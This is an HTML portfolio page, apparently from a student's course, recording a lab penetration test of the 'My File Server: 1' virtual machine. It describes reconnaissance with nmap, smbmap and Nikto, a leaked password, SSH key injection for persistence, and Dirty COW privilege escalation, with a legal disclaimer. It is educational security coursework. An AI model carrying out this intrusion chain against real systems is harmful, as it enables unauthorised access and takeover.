@@ -1,0 +1,799 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Act. 13: Red Team Pentest // ctOS Database</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        ctosBlue: '#00a8ff',
+                        ctosDark: '#0a0a0c',
+                        ctosGray: 'rgba(20, 20, 25, 0.75)'
+                    },
+                    fontFamily: {
+                        cyber: ['Orbitron', 'sans-serif'],
+                        mono: ['Fira Code', 'monospace']
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        body { background-color: #050505; overflow-x: hidden; cursor: crosshair; }
+
+        #matrix-bg {
+            position: fixed; top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            z-index: -2; opacity: 0.25;
+        }
+
+        .vignette {
+            position: fixed; top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            box-shadow: inset 0 0 150px rgba(0,0,0,0.9);
+            z-index: -1; pointer-events: none;
+        }
+
+        .scanlines {
+            position: fixed; top: 0; left: 0;
+            width: 100vw; height: 100vh; z-index: -1; pointer-events: none;
+            background: linear-gradient(to bottom, rgba(255,255,255,0), rgba(255,255,255,0) 50%, rgba(0,0,0,0.1) 50%, rgba(0,0,0,0.1));
+            background-size: 100% 4px;
+        }
+
+        .hud-corners { position: relative; }
+        .hud-corners::before, .hud-corners::after {
+            content: ''; position: absolute; width: 15px; height: 15px; border-color: #00a8ff; border-style: solid;
+        }
+        .hud-corners::before { top: -1px; left: -1px; border-width: 2px 0 0 2px; }
+        .hud-corners::after { bottom: -1px; right: -1px; border-width: 0 2px 2px 0; }
+
+        .scrollbar-hide::-webkit-scrollbar { display: none; }
+        .scrollbar-hide { -ms-overflow-style: none; scrollbar-width: none; }
+
+        .zoomable-img { cursor: zoom-in; transition: transform 0.3s ease, filter 0.3s ease; }
+        .zoomable-img:hover { filter: brightness(1.1); }
+    </style>
+</head>
+<body class="font-mono text-gray-300 min-h-screen flex flex-col">
+
+    <canvas id="matrix-bg"></canvas>
+    <div class="vignette"></div>
+    <div class="scanlines"></div>
+    
+    <div class="fixed top-2 right-4 z-50 flex items-center gap-2 font-cyber font-bold tracking-widest text-white text-xs opacity-70 pointer-events-none">
+        <span class="w-2 h-2 bg-red-600 rounded-full animate-pulse"></span>
+        <span>REC</span>
+    </div>
+
+    <!-- ENCABEZADO -->
+    <header class="bg-black/95 backdrop-blur-md border-b border-ctosBlue/50 py-3 px-4 md:px-6 sticky top-0 z-50 shadow-[0_4px_20px_rgba(0,168,255,0.15)] w-full group">
+        <div class="max-w-[1800px] mx-auto flex flex-col xl:flex-row items-center justify-between gap-6">
+
+            <div class="flex items-center gap-4 w-full xl:w-auto justify-center xl:justify-start border-b border-white/10 xl:border-none pb-3 xl:pb-0">
+                <div class="flex-shrink-0 animate-pulse text-ctosBlue drop-shadow-[0_0_8px_rgba(0,168,255,0.8)] group-hover:drop-shadow-[0_0_15px_rgba(0,168,255,1)] transition-all duration-300">
+                    <svg viewBox="0 0 100 100" class="w-10 h-10 md:w-12 md:h-12 fill-current">
+                        <path d="M50 5 L95 25 L85 85 L50 95 L15 85 L5 25 Z" fill="none" stroke="currentColor" stroke-width="4"/>
+                        <path d="M25 35 L50 15 L75 35 L65 70 L50 55 L35 70 Z" fill="currentColor"/>
+                    </svg>
+                </div>
+                <div class="flex flex-col items-start overflow-hidden">
+                    <div class="flex items-center gap-2 md:gap-3 flex-nowrap">
+                        <div class="bg-ctosBlue text-black font-cyber text-[9px] md:text-[10px] font-bold px-1.5 py-0.5 uppercase tracking-widest flex-shrink-0">SYS_ACTIVE</div>
+                        <h1 class="font-cyber text-lg md:text-2xl font-bold tracking-widest text-white uppercase whitespace-nowrap flex-shrink-0" id="telemetry-name" data-value="SAMUEL LÓPEZ GÓMEZ">SAMUEL LÓPEZ GÓMEZ</h1>
+                    </div>
+                    <div class="text-[9px] md:text-xs text-gray-400 font-mono tracking-widest mt-1 whitespace-nowrap flex items-center gap-2">
+                        <span class="text-ctosBlue font-cyber font-bold tracking-wider">ALIAS: [smrunner]</span>
+                        <span class="text-gray-600">|</span>
+                        <span>CNO IV // PERIODO: AGOSTO - DICIEMBRE 2026 // UPSLP</span>
+                    </div>
+                </div>
+            </div>
+
+            <nav class="flex flex-nowrap items-center justify-start xl:ml-auto gap-3 md:gap-4 text-[10px] md:text-xs font-mono uppercase tracking-widest w-full xl:w-auto max-w-full overflow-x-auto whitespace-nowrap pb-1 xl:pb-0 scrollbar-hide">
+                <a href="index.html" class="text-white hover:text-ctosBlue transition-colors flex-shrink-0">> INICIO</a>
+                <a href="Parcial1.html" class="text-white hover:text-ctosBlue transition-colors flex-shrink-0">> PARCIAL_1</a>
+                <a href="Parcial2.html" class="text-ctosBlue font-bold drop-shadow-[0_0_5px_rgba(0,168,255,0.8)] flex-shrink-0">> PARCIAL_2</a>
+                <a href="javascript:void(0);" class="text-gray-600 hover:text-red-500 transition-colors cursor-not-allowed flex-shrink-0" title="Acceso Denegado">> PARCIAL_3</a>
+                <a href="javascript:void(0);" class="text-gray-600 hover:text-red-500 transition-colors cursor-not-allowed flex-shrink-0" title="Pendiente de Carga">> CERTIFICACIONES</a>
+                <a href="Roadtohof.html" class="text-gray-400 hover:text-ctosBlue transition-colors flex-shrink-0">> ROAD_TO_HOF</a>
+                <a href="index.html#contacto" class="text-gray-400 hover:text-ctosBlue transition-colors flex-shrink-0 pr-4 md:pr-6">> CONTACTO</a>
+                <span class="w-4 md:w-8 flex-shrink-0 inline-block"></span>
+            </nav>
+        </div>
+    </header>
+
+    <main class="max-w-7xl w-full mx-auto mt-8 mb-10 p-4 md:p-8 relative z-10 scroll-mt-28 flex-grow">
+        
+        <!-- Botón de regreso -->
+        <div class="mb-6">
+            <a href="Parcial2.html" class="inline-flex items-center gap-2 border border-ctosBlue text-ctosBlue font-bold px-4 py-2 uppercase text-xs hover:bg-ctosBlue hover:text-black transition-colors cursor-crosshair">
+                <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="square" stroke-linejoin="miter" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path></svg>
+                [ REGRESAR_AL_DIRECTORIO_P2 ]
+            </a>
+        </div>
+
+        <div class="bg-ctosGray backdrop-blur-md border border-white/10 p-6 md:p-10 pt-12 md:pt-10 hud-corners shadow-2xl flex flex-col gap-8 relative">
+
+            <!-- ETIQUETA SUPERIOR -->
+            <div class="absolute top-0 right-0 bg-red-900/40 border-l border-b border-red-500/50 px-3 py-1 font-cyber text-[10px] md:text-xs font-bold text-red-500 tracking-widest animate-pulse">
+                RED_TEAM_DOSSIER
+            </div>
+
+            <!-- TÍTULO PRINCIPAL Y METADATA -->
+            <div class="flex flex-col md:flex-row md:items-start justify-between gap-4 border-b border-ctosBlue/30 pb-6 mb-2">
+                <div class="flex items-start gap-4">
+                    <svg class="w-10 h-10 text-red-500 animate-pulse flex-shrink-0 mt-1" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="square" stroke-linejoin="miter" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
+                    <div>
+                        <h2 class="text-2xl md:text-3xl font-cyber font-bold text-white uppercase tracking-widest leading-tight">Actividad 13: Prueba de Penetración (My File Server 1)</h2>
+                        <div class="flex flex-wrap gap-2 mt-3">
+                            <span class="px-2 py-0.5 text-[10px] font-bold uppercase tracking-widest bg-red-900/40 text-red-400 border border-red-500/50">FULL SYSTEM COMPROMISE</span>
+                            <span class="px-2 py-0.5 text-[10px] font-bold uppercase tracking-widest bg-amber-900/40 text-amber-400 border border-amber-500/50">CVE-2016-5195 (DIRTY COW)</span>
+                            <span class="px-2 py-0.5 text-[10px] font-bold uppercase tracking-widest bg-ctosBlue/20 text-ctosBlue border border-ctosBlue/50">RED TEAM ENGAGEMENT</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- BARRA DE DESCARGA MULTIPLE -->
+            <div class="border border-ctosBlue/50 bg-ctosBlue/10 p-5 relative group flex flex-col lg:flex-row lg:items-center justify-between gap-4 shadow-[0_0_15px_rgba(0,168,255,0.1)]">
+                <div class="absolute top-0 right-0 bg-ctosBlue text-black px-2 py-0.5 font-cyber text-[10px] font-bold tracking-widest">
+                    ATTACHMENTS_FOUND
+                </div>
+                
+                <div class="flex items-center gap-4 w-full lg:w-auto mt-2 lg:mt-0">
+                    <div class="text-ctosBlue flex-shrink-0">
+                        <svg class="w-8 h-8" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="square" stroke-linejoin="miter" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path></svg>
+                    </div>
+                    <div>
+                        <h4 class="text-white font-cyber font-bold uppercase tracking-widest text-base">Archivos del Proyecto</h4>
+                        <p class="text-gray-400 font-mono text-[10px] md:text-xs mt-1">Reporte y documentación técnica de la actividad y presentación profesional</p>
+                    </div>
+                </div>
+
+                <div class="flex flex-wrap items-center gap-3 w-full lg:w-auto">
+                    <!-- IMPORTANTE: Cambia "Reporte_Actividad13.pdf" por tu archivo real -->
+                    <a href="Actividad13.pdf" target="_blank" rel="noopener noreferrer" class="inline-flex items-center justify-center gap-2 border border-ctosBlue text-ctosBlue font-cyber font-bold px-4 py-2.5 text-[10px] md:text-xs uppercase tracking-widest hover:bg-ctosBlue hover:text-black transition-all duration-300 flex-1 lg:flex-none cursor-crosshair">
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="square" stroke-linejoin="miter" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"></path></svg>
+                        [ ABRIR_REPORTE ]
+                    </a>
+                    
+                    <!-- BOTÓN RED TEAM REPORT -->
+                    <a href="Actividad13Presentacion.pdf" target="_blank" rel="noopener noreferrer" class="inline-flex items-center justify-center gap-2 border border-red-500 text-red-500 font-cyber font-bold px-4 py-2.5 text-[10px] md:text-xs uppercase tracking-widest hover:bg-red-500 hover:text-black transition-all duration-300 flex-1 lg:flex-none cursor-crosshair shadow-[0_0_10px_rgba(239,68,68,0.2)]">
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="square" stroke-linejoin="miter" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>
+                        [ DESCARGAR RED TEAM REPORT ]
+                    </a>
+                </div>
+            </div>
+
+            <!-- INTRODUCCIÓN Y OBJETIVOS (3 COLUMNAS) -->
+            <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                <!-- Alcance -->
+                <section class="border border-white/10 bg-black/60 p-6 relative flex flex-col">
+                    <div class="absolute top-0 right-0 bg-white/5 border-l border-b border-white/20 px-2 py-0.5 font-cyber text-[10px] font-bold tracking-widest text-gray-400">SCOPE</div>
+                    <h3 class="text-sm font-bold text-ctosBlue uppercase tracking-widest mb-4 flex items-center gap-2">
+                        Alcance de la Evaluación
+                    </h3>
+                    <p class="text-sm leading-relaxed text-gray-300 font-mono flex-grow">
+                        Determinar el nivel de exposición y el impacto máximo alcanzable sobre la máquina virtual "My File Server: 1" (IP 192.168.56.103). Se simuló un atacante externo en un segmento aislado, aplicando la metodología PTES sin credenciales previas.
+                    </p>
+                </section>
+                <!-- Vulnerabilidades Clave -->
+                <section class="border border-yellow-500/30 bg-yellow-900/10 p-6 relative flex flex-col">
+                    <div class="absolute top-0 right-0 bg-yellow-500/20 border-l border-b border-yellow-500/50 px-2 py-0.5 font-cyber text-[10px] font-bold tracking-widest text-yellow-400">KEY_FINDINGS</div>
+                    <h3 class="text-sm font-bold text-yellow-400 uppercase tracking-widest mb-4 flex items-center gap-2">
+                        Vulnerabilidades Críticas
+                    </h3>
+                    <ul class="text-sm leading-relaxed text-gray-300 font-mono flex-grow list-disc pl-4 space-y-2">
+                        <li>Fuga de información (readme.txt expone credenciales).</li>
+                        <li>Configuración insegura FTP (Acceso de escritura en directorio home).</li>
+                        <li>Escalada de Privilegios Local mediante condición de carrera (Dirty COW).</li>
+                    </ul>
+                </section>
+                <!-- Resultado Final -->
+                <section class="border border-red-500/30 bg-red-900/10 p-6 relative flex flex-col shadow-[0_0_15px_rgba(239,68,68,0.15)]">
+                    <div class="absolute top-0 right-0 bg-red-500/20 border-l border-b border-red-500/50 px-2 py-0.5 font-cyber text-[10px] font-bold tracking-widest text-red-400">IMPACT</div>
+                    <h3 class="text-sm font-bold text-red-400 uppercase tracking-widest mb-4 flex items-center gap-2">
+                        Resultado del Compromiso
+                    </h3>
+                    <p class="text-sm leading-relaxed text-red-100/90 font-mono flex-grow font-bold">
+                        CRÍTICO: Compromiso Total (Acceso Root). 
+                    </p>
+                    <p class="text-xs leading-relaxed text-gray-300 font-mono mt-2">
+                        Se logró acceso al sistema mediante inyección de llave SSH y se elevó a privilegios máximos, resultando en la captura del archivo <code class="text-red-400">/root/proof.txt</code>.
+                    </p>
+                </section>
+            </div>
+
+            <!-- CONTENEDOR DE PRESENTACIÓN (IFRAME) -->
+            <section class="border border-ctosBlue/50 bg-[#050505] p-6 relative shadow-[0_0_15px_rgba(0,168,255,0.05)] mt-4">
+                <div class="absolute top-0 right-0 bg-ctosBlue/20 border-l border-b border-ctosBlue/50 px-3 py-1 font-cyber text-[10px] md:text-xs font-bold text-ctosBlue tracking-widest">
+                    EXECUTIVE_BRIEFING
+                </div>
+                <h3 class="text-lg md:text-xl font-cyber font-bold text-white uppercase tracking-widest flex items-center gap-2 mb-6 border-b border-ctosBlue/30 pb-3">
+                    Presentación Ejecutiva
+                </h3>
+                <div class="relative w-full aspect-video bg-[#0a0a0c] border border-white/10 overflow-hidden">
+                    a
+                    <iframe src="Actividad13Presentacion.pdf" class="absolute top-0 left-0 w-full h-full border-0"></iframe>
+                </div>
+            </section>
+
+            <!-- SIMULADOR DINÁMICO (TERMINAL JS) -->
+            <section class="border border-ctosBlue/50 bg-[#050505] p-6 relative shadow-[0_0_15px_rgba(0,168,255,0.05)] mt-4">
+                <div class="absolute top-0 right-0 bg-ctosBlue/20 border-l border-b border-ctosBlue/50 px-3 py-1 font-cyber text-[10px] md:text-xs font-bold text-ctosBlue tracking-widest">
+                    ATTACK_SIMULATOR
+                </div>
+                
+                <div class="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-6 pr-24 border-b border-ctosBlue/30 pb-3">
+                    <h3 class="text-lg md:text-xl font-cyber font-bold text-white uppercase tracking-widest flex items-center gap-2">
+                        Terminal de Explotación Interactiva
+                    </h3>
+                    <div class="flex flex-wrap gap-2 font-mono text-[10px]">
+                        <button onclick="setSimPhase(1)" class="px-2 py-1 bg-black border border-white/20 hover:border-ctosBlue text-gray-300 hover:text-white transition-colors">1. Nmap Scan</button>
+                        <button onclick="setSimPhase(2)" class="px-2 py-1 bg-black border border-white/20 hover:border-ctosBlue text-gray-300 hover:text-white transition-colors">2. SSH Injection</button>
+                        <button onclick="setSimPhase(3)" class="px-2 py-1 bg-red-900/20 border border-red-500/30 hover:bg-red-900/60 text-red-400 transition-colors">3. Dirty COW (Root)</button>
+                    </div>
+                </div>
+
+                <div class="p-4 bg-[#0a0a0c] border border-white/10 font-mono text-xs flex flex-col h-[350px]">
+                    <div class="flex justify-between items-center text-gray-500 border-b border-white/10 pb-2 mb-2 uppercase tracking-widest text-[10px]">
+                        <span>> KALI LINUX TERMINAL (192.168.56.102)</span>
+                        <span id="simPhaseIndicator" class="text-ctosBlue font-bold">FASE 1: RECONOCIMIENTO</span>
+                    </div>
+                    <div id="simOutputBox" class="flex-1 overflow-y-auto text-green-400 whitespace-pre-wrap select-all leading-relaxed">
+<!-- Contenido inicial cargado vía JS -->
+                    </div>
+                </div>
+            </section>
+
+            <!-- ADVERTENCIA DE SEGURIDAD -->
+            <div class="border border-red-500/50 bg-red-900/20 p-4 mt-8 flex flex-col md:flex-row items-center md:items-start gap-4 shadow-[0_0_15px_rgba(239,68,68,0.2)]">
+                <svg class="w-10 h-10 text-red-500 animate-pulse flex-shrink-0" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
+                <div class="text-center md:text-left">
+                    <h4 class="text-red-400 font-bold uppercase tracking-widest text-sm">> ADVERTENCIA LEGAL Y DE SEGURIDAD</h4>
+                    <p class="text-xs text-gray-300 font-mono mt-2 leading-relaxed">
+                        El siguiente registro paso a paso documenta técnicas ofensivas reales de enumeración, explotación y escalada de privilegios. Este ejercicio fue realizado estrictamente con fines académicos y de investigación dentro de un entorno de laboratorio aislado, seguro y controlado (VirtualBox Host-Only). El uso de estas metodologías y herramientas sobre sistemas, redes o infraestructura sin el consentimiento expreso y autorización por escrito de los propietarios es una violación a la ley.
+                    </p>
+                </div>
+            </div>
+
+            <!-- LÍNEA DE TIEMPO DEL ATAQUE (20 PASOS) -->
+            <section class="border border-white/5 bg-black/40 p-6 pt-10 md:pt-6 relative mt-4">
+                <div class="absolute top-0 right-0 bg-ctosBlue/10 border-l border-b border-ctosBlue/40 px-3 py-1 font-cyber text-[10px] md:text-xs font-bold text-ctosBlue tracking-widest animate-pulse">
+                    KILL_CHAIN
+                </div>
+                <h3 class="text-xl md:text-2xl font-cyber font-bold text-white uppercase tracking-widest border-b border-ctosBlue/30 pb-3 mb-8 pr-24">
+                    Procedimiento de Penetración (Kill Chain)
+                </h3>
+                
+                <div class="relative pl-6 sm:pl-8 border-l-2 border-ctosBlue/20 space-y-12 font-mono text-sm text-gray-300">
+                    
+                    <!-- FASE 1: Preparación (Pasos 1-3) -->
+                    <div class="relative">
+                        <div class="absolute -left-[30px] sm:-left-[39px] top-0 w-6 h-6 bg-[#050505] border-2 border-ctosBlue rounded-full flex items-center justify-center font-bold text-ctosBlue text-[10px] shadow-[0_0_10px_rgba(0,168,255,0.8)]">1</div>
+                        <h4 class="font-bold text-white uppercase text-base mb-2">Preparación de Red Aislada (Objetivo)</h4>
+                        <p class="mb-3">Se configuró el Adaptador 1 de la máquina virtual "My_file_server_1" en modo "Adaptador sólo anfitrión" (Host-Only) en VirtualBox, garantizando un entorno aislado sin exposición a redes externas.</p>
+                        <div class="bg-black/80 border border-white/20 p-2 max-w-2xl">
+                            <img src="Imagenes/Laboratorios/Act13/1.png" alt="Paso 1" class="w-full h-auto border border-white/10 zoomable-img" onclick="openImageModal(this.src)">
+                        </div>
+                    </div>
+
+                    <div class="relative">
+                        <div class="absolute -left-[30px] sm:-left-[39px] top-0 w-6 h-6 bg-[#050505] border-2 border-ctosBlue rounded-full flex items-center justify-center font-bold text-ctosBlue text-[10px] shadow-[0_0_10px_rgba(0,168,255,0.8)]">2</div>
+                        <h4 class="font-bold text-white uppercase text-base mb-2">Preparación de Red Aislada (Atacante)</h4>
+                        <p class="mb-3">De forma equivalente, la máquina atacante Kali Linux fue configurada en la misma red "VirtualBox Host-Only Ethernet Adapter" para asegurar visibilidad directa entre atacante y objetivo en el laboratorio seguro.</p>
+                        <div class="bg-black/80 border border-white/20 p-2 max-w-2xl">
+                            <img src="Imagenes/Laboratorios/Act13/2.png" alt="Paso 2" class="w-full h-auto border border-white/10 zoomable-img" onclick="openImageModal(this.src)">
+                        </div>
+                    </div>
+
+                    <div class="relative">
+                        <div class="absolute -left-[30px] sm:-left-[39px] top-0 w-6 h-6 bg-[#050505] border-2 border-ctosBlue rounded-full flex items-center justify-center font-bold text-ctosBlue text-[10px] shadow-[0_0_10px_rgba(0,168,255,0.8)]">3</div>
+                        <h4 class="font-bold text-white uppercase text-base mb-2">Arranque del Sistema Objetivo</h4>
+                        <p class="mb-3">Se inició la máquina objetivo. La pantalla de login expuso información valiosa por defecto: el sistema operativo CentOS Linux 7 (Core), el kernel 3.10.0-229 y el hostname "fileserver".</p>
+                        <div class="bg-black/80 border border-white/20 p-2 max-w-2xl">
+                            <img src="Imagenes/Laboratorios/Act13/3.png" alt="Paso 3" class="w-full h-auto border border-white/10 zoomable-img" onclick="openImageModal(this.src)">
+                        </div>
+                    </div>
+
+                    <!-- FASE 2: Descubrimiento de Red (Pasos 4-6) -->
+                    <div class="relative">
+                        <div class="absolute -left-[30px] sm:-left-[39px] top-0 w-6 h-6 bg-[#050505] border-2 border-ctosBlue rounded-full flex items-center justify-center font-bold text-ctosBlue text-[10px] shadow-[0_0_10px_rgba(0,168,255,0.8)]">4</div>
+                        <h4 class="font-bold text-white uppercase text-base mb-2">Identificación de IP Local</h4>
+                        <p class="mb-3">Desde Kali Linux, se ejecutó el comando <code class="text-ctosBlue">ip a</code> para determinar la dirección IP propia en el segmento (192.168.56.102), estableciendo el rango de escaneo para buscar al servidor.</p>
+                        <div class="bg-black/80 border border-white/20 p-2 max-w-2xl">
+                            <img src="Imagenes/Laboratorios/Act13/4.png" alt="Paso 4" class="w-full h-auto border border-white/10 zoomable-img" onclick="openImageModal(this.src)">
+                        </div>
+                    </div>
+
+                    <div class="relative">
+                        <div class="absolute -left-[30px] sm:-left-[39px] top-0 w-6 h-6 bg-[#050505] border-2 border-ctosBlue rounded-full flex items-center justify-center font-bold text-ctosBlue text-[10px] shadow-[0_0_10px_rgba(0,168,255,0.8)]">5</div>
+                        <h4 class="font-bold text-white uppercase text-base mb-2">Barrido ARP de la Red</h4>
+                        <p class="mb-3">Se utilizó la herramienta <code class="text-ctosBlue">netdiscover</code> sobre el rango 192.168.56.0/24 para identificar máquinas activas dentro de la red local aislada.</p>
+                        <div class="bg-black/80 border border-white/20 p-2 max-w-2xl">
+                            <img src="Imagenes/Laboratorios/Act13/5.png" alt="Paso 5" class="w-full h-auto border border-white/10 zoomable-img" onclick="openImageModal(this.src)">
+                        </div>
+                    </div>
+
+                    <div class="relative">
+                        <div class="absolute -left-[30px] sm:-left-[39px] top-0 w-6 h-6 bg-[#050505] border-2 border-ctosBlue rounded-full flex items-center justify-center font-bold text-ctosBlue text-[10px] shadow-[0_0_10px_rgba(0,168,255,0.8)]">6</div>
+                        <h4 class="font-bold text-white uppercase text-base mb-2">Confirmación del Objetivo</h4>
+                        <p class="mb-3">Comparando la dirección MAC descubierta con la configurada en VirtualBox, se confirmó inequívocamente que la IP de la máquina objetivo es 192.168.56.103.</p>
+                        <div class="bg-black/80 border border-white/20 p-2 max-w-2xl">
+                            <img src="Imagenes/Laboratorios/Act13/6.png" alt="Paso 6" class="w-full h-auto border border-white/10 zoomable-img" onclick="openImageModal(this.src)">
+                        </div>
+                    </div>
+
+                    <!-- FASE 3: Enumeración Activa (Pasos 7-11) -->
+                    <div class="relative">
+                        <div class="absolute -left-[30px] sm:-left-[39px] top-0 w-6 h-6 bg-[#050505] border-2 border-ctosBlue rounded-full flex items-center justify-center font-bold text-ctosBlue text-[10px] shadow-[0_0_10px_rgba(0,168,255,0.8)]">7</div>
+                        <h4 class="font-bold text-white uppercase text-base mb-2">Escaneo de Puertos Nmap</h4>
+                        <p class="mb-3">Se lanzó un escaneo de puertos exhaustivo (-p-) y agresivo (-A) con Nmap apuntando a la IP 192.168.56.103 para descubrir todos los servicios expuestos, sus versiones y posibles vulnerabilidades base.</p>
+                        <div class="bg-black/80 border border-white/20 p-2 max-w-2xl">
+                            <img src="Imagenes/Laboratorios/Act13/7.png" alt="Paso 7" class="w-full h-auto border border-white/10 zoomable-img" onclick="openImageModal(this.src)">
+                        </div>
+                    </div>
+
+                    <div class="relative">
+                        <div class="absolute -left-[30px] sm:-left-[39px] top-0 w-6 h-6 bg-[#050505] border-2 border-ctosBlue rounded-full flex items-center justify-center font-bold text-ctosBlue text-[10px] shadow-[0_0_10px_rgba(0,168,255,0.8)]">8</div>
+                        <h4 class="font-bold text-white uppercase text-base mb-2">Resultados Nmap (Parte 1)</h4>
+                        <p class="mb-3">El reporte de Nmap evidenció puertos críticos abiertos: FTP (21) ejecutando vsftpd con login anónimo y acceso de escritura, SSH (22), HTTP (80) con Apache 2.4.6, y RPC (111).</p>
+                        <div class="bg-black/80 border border-white/20 p-2 max-w-2xl">
+                            <img src="Imagenes/Laboratorios/Act13/8.png" alt="Paso 8" class="w-full h-auto border border-white/10 zoomable-img" onclick="openImageModal(this.src)">
+                        </div>
+                    </div>
+
+                    <div class="relative">
+                        <div class="absolute -left-[30px] sm:-left-[39px] top-0 w-6 h-6 bg-[#050505] border-2 border-ctosBlue rounded-full flex items-center justify-center font-bold text-ctosBlue text-[10px] shadow-[0_0_10px_rgba(0,168,255,0.8)]">9</div>
+                        <h4 class="font-bold text-white uppercase text-base mb-2">Resultados Nmap (Parte 2)</h4>
+                        <p class="mb-3">Continuando con el escaneo, se detectó también un servicio SMB en el puerto 445 (Samba 4.9.1) que permite Null Session, junto con un segundo FTP (2121) ejecutando ProFTPD.</p>
+                        <div class="bg-black/80 border border-white/20 p-2 max-w-2xl">
+                            <img src="Imagenes/Laboratorios/Act13/9.png" alt="Paso 9" class="w-full h-auto border border-white/10 zoomable-img" onclick="openImageModal(this.src)">
+                        </div>
+                    </div>
+
+                    <div class="relative">
+                        <div class="absolute -left-[30px] sm:-left-[39px] top-0 w-6 h-6 bg-[#050505] border-2 border-ctosBlue rounded-full flex items-center justify-center font-bold text-ctosBlue text-[10px] shadow-[0_0_10px_rgba(0,168,255,0.8)]">10</div>
+                        <h4 class="font-bold text-white uppercase text-base mb-2">Enumeración SMB (smbmap)</h4>
+                        <p class="mb-3">Aprovechando la detección del puerto 445, se utilizó <code class="text-ctosBlue">smbmap</code> contra el objetivo. Esto reveló la existencia de un recurso compartido llamado "smbdata" con permisos totales de Lectura y Escritura (READ, WRITE) sin requerir autenticación.</p>
+                        <div class="bg-black/80 border border-white/20 p-2 max-w-2xl">
+                            <img src="Imagenes/Laboratorios/Act13/10.png" alt="Paso 10" class="w-full h-auto border border-white/10 zoomable-img" onclick="openImageModal(this.src)">
+                        </div>
+                    </div>
+
+                    <div class="relative">
+                        <div class="absolute -left-[30px] sm:-left-[39px] top-0 w-6 h-6 bg-[#050505] border-2 border-ctosBlue rounded-full flex items-center justify-center font-bold text-ctosBlue text-[10px] shadow-[0_0_10px_rgba(0,168,255,0.8)]">11</div>
+                        <h4 class="font-bold text-white uppercase text-base mb-2">Escaneo de Vulnerabilidades Web (Nikto)</h4>
+                        <p class="mb-3">Se lanzó el escáner Nikto contra el puerto 80. Además de señalar cabeceras ausentes y software obsoleto, la herramienta detectó un archivo altamente sospechoso en la raíz: <code class="text-ctosBlue">/readme.txt</code>.</p>
+                        <div class="bg-black/80 border border-white/20 p-2 max-w-2xl">
+                            <img src="Imagenes/Laboratorios/Act13/11.png" alt="Paso 11" class="w-full h-auto border border-white/10 zoomable-img" onclick="openImageModal(this.src)">
+                        </div>
+                    </div>
+
+                    <div class="relative">
+                        <div class="absolute -left-[30px] sm:-left-[39px] top-0 w-6 h-6 bg-[#050505] border-2 border-amber-500 rounded-full flex items-center justify-center font-bold text-amber-500 text-[10px] shadow-[0_0_10px_rgba(245,158,11,0.8)]">12</div>
+                        <h4 class="font-bold text-white uppercase text-base mb-2">Fuga de Información (Credenciales Expuestas)</h4>
+                        <p class="mb-3">Al navegar manualmente hacia <code class="text-amber-400">http://192.168.56.103/readme.txt</code>, se encontró un documento en texto plano que divulgaba de forma directa una contraseña válida del sistema: <code class="text-amber-400 font-bold">rootroot1</code>. Cruzando esto con el usuario "smbuser" detectado antes, se obtuvo un vector de entrada.</p>
+                        <div class="bg-black/80 border border-amber-500/20 p-2 max-w-2xl">
+                            <img src="Imagenes/Laboratorios/Act13/12.png" alt="Paso 12" class="w-full h-auto border border-amber-500/30 zoomable-img" onclick="openImageModal(this.src)">
+                        </div>
+                    </div>
+
+                    <!-- FASE 4: Acceso Inicial y Persistencia (Pasos 13-17) -->
+                    <div class="relative">
+                        <div class="absolute -left-[30px] sm:-left-[39px] top-0 w-6 h-6 bg-[#050505] border-2 border-amber-500 rounded-full flex items-center justify-center font-bold text-amber-500 text-[10px] shadow-[0_0_10px_rgba(245,158,11,0.8)]">13</div>
+                        <h4 class="font-bold text-white uppercase text-base mb-2">Generación de Llaves SSH (Local)</h4>
+                        <p class="mb-3">Para asegurar una persistencia sigilosa, en la máquina Kali se generó un par de llaves criptográficas RSA usando <code class="text-amber-400">ssh-keygen</code>, con la intención de subir la llave pública al servidor vulnerado.</p>
+                        <div class="bg-black/80 border border-amber-500/20 p-2 max-w-2xl">
+                            <img src="Imagenes/Laboratorios/Act13/13.png" alt="Paso 13" class="w-full h-auto border border-amber-500/30 zoomable-img" onclick="openImageModal(this.src)">
+                        </div>
+                    </div>
+
+                    <div class="relative">
